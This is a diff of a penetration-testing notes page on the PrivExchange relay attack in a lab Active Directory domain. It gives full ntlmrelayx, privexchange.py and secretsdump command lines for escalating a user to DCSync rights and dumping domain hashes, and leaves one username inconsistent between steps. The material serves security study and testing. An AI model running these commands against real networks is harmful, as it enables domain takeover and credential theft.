@@ -19,16 +19,19 @@ If Exchange is running with high privileges, using a relay attack can allow an a
 4. Modify privileges using Exchange server account<br/>
 5. Perform DCSync attack<br/>
 <br/>
-Need <a href="https://github.com/dirkjanm/privexchange">privexchange.py</a>&nbsp;and <a href="https://github.com/SecureAuthCorp/impacket/">ntlmrelayx</a>. Start ntlmrelayx in relay mode with LDAP on a DC as the target. Supply a user under the attackers control to escalate privileges with (in these examples, the 'nty' user). <br/>
-<br/>
-ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu<br/>
+Need <a href="https://github.com/dirkjanm/privexchange">privexchange.py</a>&nbsp;and <a href="https://github.com/SecureAuthCorp/impacket/">ntlmrelayx</a>. Start ntlmrelayx in relay mode with LDAP on a DC as the target. Supply a user under the attackers control to escalate privileges with (in these examples, the 'nty' user):<br/>
+ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user nty<br/>
 <br/>
 Now run the privexchange.py script<br/>
+python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u nty -d testsegment.local<br/>
 <br/>
-python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local<br/>
+<img src="image.png" /><br/>
 <br/>
-After a minute (which is the value supplied for the push notification) we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges. This can be confirmed with secretsdump:<br/>
+After a minute (which is the value supplied for the push notification) we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges.<br/>
+<img src="image 2.png" /><br/>
 <br/>
+<br/>
+This can be confirmed with secretsdump:<br/>
 secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc<br/>
 <br/>
 <b>Performing the Attack With NO Credentials<br/>
